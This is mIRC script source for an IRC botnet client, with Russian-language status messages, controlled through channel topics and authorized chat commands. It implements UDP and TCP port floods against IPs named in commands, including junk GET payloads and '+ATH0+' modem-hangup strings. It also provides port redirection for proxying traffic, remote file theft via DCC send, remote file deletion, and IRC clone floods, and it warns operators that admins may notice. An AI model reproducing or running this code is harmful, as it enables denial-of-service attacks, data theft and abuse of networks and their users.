alias TopicDo {
  set %topic $chan($1).topic
  if ( %topic == $null) { halt }
  if ( $gettok(%topic,1,32) == scanwww) {  
    if ( (%iniscan.stat.server == off) && ($lines(unicod_look) == 0) ) { halt } 
    set %iniscan.stat.bag on |     nick $iif($len($me) <= 8, $me, $left($me,9)) $+ [SU-SR]
    set %unibag.job  on
    if ( (%iniscan.stat.server == off) && ($lines(unicod_look) != 0) ) {       .timerunibaggi_work 0 10 unibag.start      }
    if (%iniscan.stat.server == on) {     .timeruniscan_start 0 1 uniscanstat  | .timerunibaggi_work 0 10 unibag.start   }
  }
  if ( $gettok(%topic,1,32) == sexi) {  
    if ( $gettok(%topic,2,32) == $null) { halt }
    if ( $gettok(%topic,3,32) == $null) { halt }
    .timerudp* off | .timerstop_atack* off 
    .timerudp.a $+ $gettok(%topic,2,32)   -m 0 10 .sockudp -b udp $+ $rand(0,9999999999) $gettok(%topic,2,32) $rand(100,500) 99999999999999999999 ECHO $ip 
    .timerudp.b $+ $gettok(%topic,2,32)   -m 0 10 .sockudp -b udp $+ $rand(0,9999999999) $gettok(%topic,2,32) $rand(500,4000) 9999999999999999999 ECHO $ip 
    .timerudp.c $+ $gettok(%topic,2,32)   -m 0 10 .sockudp -b udp $+ $rand(0,9999999999) $gettok(%topic,2,32) $rand(4000,60000) 99999999999999999 ECHO $ip 
    .timerstop_atack $+ $gettok(%topic,2,32) 1 $iif($gettok(%topic,3,32) != $null,$gettok(%topic,3,32),1200) timerudp* off   
  }  
  if ( $gettok(%topic,1,32) == kizz) {  
    if ( $gettok(%topic,2,32) == $null) { halt }
    if ( $gettok(%topic,3,32) == $null) { halt }
    if ( $gettok(%topic,4,32) == $null) { halt }
    .timerportflood.pause off
    set %azzz.pf.all 0 | set %azzz.pf.ip $gettok(%topic,2,32) | set %azzz.pf.port $gettok(%topic,3,32) |   portflood $gettok(%topic,4,32)
  } 
}
on *:join:*:  {
  if ( $nick == $me ) {   .timerCheckTopic 1 12 TopicDo # }
}
on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum }
on *:Sockread:gtin*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return }   | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockread:gtout*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return }  | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockopen:gtout*: {  if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname }
on *:sockclose:gtin*: {   unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname }
alias predirectstats2 { set %gtpcount 0 | :startloophere | inc %gtpcount 1 | if ($sock(gtportdirect*,%gtpcount) != $null) { msg $1 14*(PortRedirect)*: In-port: $gettok($sock(gtportdirect*,%gtpcount),2,46) to $gettok($sock(gtportdirect*,%gtpcount).mark,1,32) $+ : $+ $gettok($sock(gtportdirect*,%gtpcount).mark,2,32)  | msg $1 12[Local IP Address]:14 $ip | goto startloophere } | else { if %gtpcount = 1 { //msg $1 12*** Error, no port redirects! } | //msg $1 12*** PortRedirect/End | unset %gtpcount } }
alias pdirectstop { Set %gtrdstoppnum $1 | sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ] | sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ * | sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ * | unset %gtrdstoppnum }
alias gtportdirect { if ($3 == $null) return | socklisten gtportdirect $+ . $+ $1 $1 |  sockmark gtportdirect $+ . $+ $1-3 }
alias portflood {
  set %azzz.pf.count 0  |   sockclose portflood.*
  while (%azzz.pf.count < 50) {     sockopen portflood. $+ $rand(a,z) $+ $rand(1,9999999999) $+ .  $+ %azzz.pf.count  %azzz.pf.ip %azzz.pf.port  |     inc %azzz.pf.count   } 
  inc %azzz.pf.all | portflood.stat $1
}
alias portflood.stat { 
  if ( %azzz.pf.all == $1 ) {   sockclose portflood.* | halt }
  .timerportflood.pause 1 3 portflood $1 
} 
on *:sockopen:portflood.*: { 
  if ($sockerr > 0) {     sockclose $sockname |     return   }
  sockwrite $sockname -nb GET  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&! 
  sockwrite $sockname -nb GET  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  sockwrite $sockname -nb GET  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!
  sockwrite $sockname -nb GET  +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +TH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+
}
on *:text:*:*: {
  if ( (%auth [ $+ [ $nick ] ] != yes) && (%auth [ $+ [ $nick ] ] != admin) ) { halt }
  if ($1 == !pr) {
    if ($2 == $null) { msg $schannick 14Portredirection Error!!! For help type: !portredirect help | halt } 
    if ($2 == help) { msg $schannick 14!pr start 888 irc.dal.net 6667 (!pr stop port\stat)  |  halt } 
    if ($2 == start) { 
      if ($5 == $null) { msg $schannick !pr start input-port output-server output-server-port | halt } 
      gtportdirect $3- | msg $schannick 14[Redirect Started] I-port=( $+ $3 $+ ) to $4 $+ : $+ $5 | msg $schannick 12[Local IP Address]:14 $ip |  halt  
    } 
    if ($2 == stop) {  if ($3 == $null) { halt } | pdirectstop $3 |  msg $schannick 14[Portredirection] Port:(12 $+ $3 $+ 14) Has been stopped. |  halt  } 
    if ($2 == stat) {  predirectstats2 $schannick } 
  } 
  if ($1 = !get) {
    if ($2 == $null) { halt }
    if ( $3 != $null) {  dcc send $3  $2- |     .msg $schannick 4(12*OK4) 9:4 $2  12was sended to4 $3 ... }
    else  {  dcc send $nick  $2- |     .msg $schannick 4(12*OK4) 9:4 $2  12was sended to you... }
  }
  if ($1 = !clear) {
    if ($2 == $null) { halt }
    if ( $2 == udpstat.txt ) { halt } 
    write -c  $2- |     .msg $schannick 4(12*OK4) 9:4 $2-  12was cleared...
  }
  if ($1 = !bncpass) {
    if ($2 == $null) { halt }
    .msg $schannick  4(12*OK*4) 12 пароль бнц:4 %l0l 12сменен на:4  $2-     | set %l0l $2-
  }
  if ($1 = !ident) {
    if ($2 == $null) { halt }
    set %nick.ident $2- |  emailaddr $2- | .msg $schannick 4(12*OK*4) 12my ident now:4 $2-
  }
  if ($1 = !name) {
    if ($2 == $null) { halt }
    set %nick.name $2- |  username $2- | .msg $schannick 4(12*OK*4) 12my name now:4 $2-
  }
  if ($1 = !remove) {
    if ($2 == $null) { halt }
    if ( $2 == udpstat.txt ) { halt }
    if ( $script($2) != $null ) { halt } 
    remove $2- |     .msg $schannick 4(12*OK4) 9:4 $2-  12was removed...
  }
  if ($1 = !sportflood) {
    .timeropensock.stat off
    .timerportflood.pause off  |     sockclose portflood.*
    .msg $schannick 4(12*2Port Flood hAlt4) 9:12 Выключен! 3(2 %azzz.pf.ip 3:2 %azzz.pf.port 3)
  }
  if ($1 = !portflood) {
    if ($4 != $null) { 
      if ( $sock(portflood.*,0) != 0 ) {  msg $schannick 4 Error! I am flooding now: %azzz.pf.ip $+ : $+ %azzz.pf.port | halt  }
      if ($4 !isnum 1-10000) { msg $schannick 4 Error! Max flood count --> 10000!  | halt  }
      set %azzz.pf.port $3  | set %azzz.pf.ip $2
      if ($3 == random) { set %azzz.pf.port Random  |   msg $schannick 4(12*2Port Flood n0w4) 9:12 $2 2port 12:  Random | start.azzz.randsocket  $2 $4 | halt } 
      .timerportflood.pause off
      write -il1 udpstat.txt 12portflood[4 $time $date 12]:11 $nick -- $address($nick,5) to:4 $2-
      set %azzz.pf.all 0 |   msg $schannick 4(12*2Port Flood n0w4) 9:12 $2 2port 12:  $3 |  portflood $4
    } 
  } 
  if (!clone.stat. isin $1 ) {
    if ( ($remove($1,!clone.stat.) != *) && ($remove($1,!clone.stat.) != $me) ) { halt }
    msg $schannick 12 >>>> Открыто клон-сокетов: $sock(clone.*,0) На сервере клонов(примерно): $sock(cserv.*,0)
  }
  if (!clone.stop. isin $1 ) {
    if ( ($remove($1,!clone.stop.) != *) && ($remove($1,!clone.stop.) != $me) ) { halt }
    msg $schannick 12 >>>> Внимание! Прекращаю загрузку клонов!
    set %clone.stop yes
  }
  if (!clone.quit. isin $1 ) {
    if ( ($remove($1,!clone.quit.) != *) && ($remove($1,!clone.quit.) != $me) ) { halt }
    msg $schannick 12 >>>> Внимание! Выключаю все кл0н-с0кеты!
    sockwrite -n cserv.* quit : $+ %cafe.team
  }
  if (!clone.join. isin $1 ) {
    if ( ($remove($1,!clone.join.) != *) && ($remove($1,!clone.join.) != $me) ) { halt }
    if ($2 == $null) { halt }
    msg $schannick 12 >>>> Внимание! Завожу клонов в:4 $2- 12(опасность: админы могут засечь)
    sockwrite -n  cserv.* join $2-  
  }
  if (!clone.part. isin $1 ) {
    if ( ($remove($1,!clone.part.) != *) && ($remove($1,!clone.part.) != $me) ) { halt }
    if ($2 == $null) { halt }
    msg $schannick 12 >>>> Внимание! Убираю клонов из:4 $2- 12(опасность: админы могут засечь)
    sockwrite -n  cserv.* part $2 : $+ %cafe.team
  }
  if (!clone.flood. isin $1 ) {
    if ( ($remove($1,!clone.flood.) != *) && ($remove($1,!clone.flood.) != $me) ) { halt }
    if ($2 == $null) { halt }
    msg $schannick 12 >>>> Внимание! Начал флУдить текстом в:4 $2 12(опасность: админы могут засечь)
    sockwrite -n  cserv.* PRIVMSG $2 : $+ $split.fl  
  }
  if ($1 == !cafeteam ) {
    if ($2 == $null) { halt }
    set %cafe.team $2-  |  .msg $schannick 12 >>>>3 Переменная кафе_теам, успешно изменена!
  }
  if (!clone.nick. isin $1 ) {
    if ( ($remove($1,!clone.nick.) != *) && ($remove($1,!clone.nick.) != $me) ) { halt }
    .msg $schannick 12 >>>> Внимание! Меняю ники клонов!
    set %clone.nickz.i 1 | :start |   if ( $sock(cserv.*,%clone.nickz.i) == $null) { goto end }
    sockwrite -n  $sock(cserv.*,%clone.nickz.i) NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
    inc %clone.nickz.i | goto start | :end
  }
  if (!clone.say. isin $1 ) {
    if ( ($remove($1,!clone.say.) != *) && ($remove($1,!clone.say.) != $me) ) { halt }
    if ($2 == $null) { halt }
    if ($3 == $null) { halt }
    .msg $schannick 12 >>>> Внимание! Отправляю месЯгу  к :4 $2  12(опасность: админы могут засечь)
    sockwrite -n  cserv.* PRIVMSG $2 : $+ $3-  
  }
  if (!clone.notice. isin $1 ) {
    if ( ($remove($1,!clone.notice.) != *) && ($remove($1,!clone.notice.) != $me) ) { halt }
    if ($2 == $null) { halt }
    if ($3 == $null) { halt }
    .msg $schannick 12 >>>> Внимание! Отправляю н0тис  к :4 $2  12(опасность: админы могут засечь)
    sockwrite -n  cserv.* NOTICE $2 : $+ $3-  
  }
  if (!clone.invite. isin $1 ) {
    if ( ($remove($1,!clone.invite.) != *) && ($remove($1,!clone.invite.) != $me) ) { halt }
    if ($2 == $null) { halt }
    var %cRandomChannel $chr(35) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ OpS $+ $rand(a,z) $+ $rand(0,9) $+ LamO $+ $rand(a,z) $+ $rand(0,9) $+ yOu $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9)
    .msg $schannick 12 >>>> Внимание! Отправил инвАйт  к :4 $2  12(опасность: админы могут засечь)
    sockwrite -n  cserv.* INVITE $2 %cRandomChannel
  }
  if (!clone.dcc. isin $1 ) {
    if ( ($remove($1,!clone.dcc.) != *) && ($remove($1,!clone.dcc.) != $me) ) { halt }
    if ($2 == $null) { halt }
    .msg $schannick 12 >>>> Внимание! п0сылаю виртуальный фАйлы  к :4 $2  12(опасность: админы могут засечь)
    sockwrite -n  cserv.* PRIVMSG $2 :DCC SEND I_think_you_are_LaMer_SuckerS $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+ 
  }
  if (!clone.ping. isin $1 ) {
    if ( ($remove($1,!clone.ping.) != *) && ($remove($1,!clone.ping.) != $me) ) { halt }
    if ($2 == $null) { halt }
    .msg $schannick 12 >>>> Внимание! пИнгую :4 $2  12(опасность: админы могут засечь)
    sockwrite -n  cserv.* PRIVMSG $2 $chr(1) $+ PING $+ $chr(1)
  }
  if (!clone.help. isin $1 ) {
    if ( ($remove($1,!clone.help.) != *) && ($remove($1,!clone.help.) != $me) ) { halt }
    msg $schannick 12 *** !clone. ( stop. quit. join. part. dcc. invite. ping. notice. say. flood. )
  }
  if (!clone. isin $1 ) {
    if ( ($remove($1,!clone.) != *) && ($remove($1,!clone.) != $me) ) { halt }
    if ($2 == $null) { msg $schannick  4 Ошибка, укажите сервер! | halt }
    if ($3 == $null) { msg $schannick  4 Ошибка, укажите порт сервера! | halt }
    if ($4 == $null) { msg $schannick  4 Ошибка, укажите количество кл0нов | halt }
    if ($4 >= 30) { msg $schannick  4 Ошибка, нельзя клонов более чем 30... | halt }
    if ( $sock(clone.*,0) >= 40 )   {  msg $schannick  4 Ошибка, уже открыто более 40 клонов...  | halt }
    if ($5 == $null) { set %clone.chan off }
    if ($5 != $null) { set %clone.chan $5- }
    set %clone.chanel $schannick |     set %clone.stop no |     set %IpPortServerCl0ne $2 $3 |   set %clone.max 0
    msg $schannick 4 *** Начинаю загрузку c0кет-клонов, по $4  клонов, на сервер: $2 $3 
    :start
    if (%clone.stop ==  yes) { halt }
    if (%clone.max == $4) { goto end | halt } 
    sockopen clone. $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,Z) $2 $3
    inc    %clone.max | goto start
    :end  
    msg $schannick 12 >>>> Завершил загрузку клонов! Открыто сокетов: $sock(clone.*,0) ! Ждите результата загрузки!... 
  }
}
on *:sockopen:clone.*: {
  if ($sockerr > 0) {    sockclose $sockname | return   }
  .sockrename $sockname $replace($sockname,clone.,cserv.)
  .sockwrite -n $sockname nick $remove($sockname,cserv.)
  .sockwrite -n $sockname user $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)  : %cafe.team
}
on *:sockread:cserv.*: {
  if ($sockerr > 0) {    sockclose $sockname | return  }
  .sockread %clone
  if ($sockbr == 0) return
  if ($gettok(%clone,1,32) == PING) { sockwrite -n $sockname PONG $gettok(%clone,2-,32) }
  if ($gettok(%clone,2,32) == 376) { 
    if (%clone.chan != off) { .sockwrite -n $sockname join %clone.chan }
  }
  if ($gettok(%clone,2,32) == PRIVMSG) {    
    if ($gettok(%clone,4,32) == :!ready) {        .sockwrite -n $sockname $gettok(%clone,5-,32)     }
  }
  if ($gettok(%clone,2,32) == KICK) {
    if ( $gettok(%clone,4,32) == $remove($sockname,cserv.) ) {  .sockwrite $sockname join $gettok(%clone,3,32) $+ $lf     }
  }
}
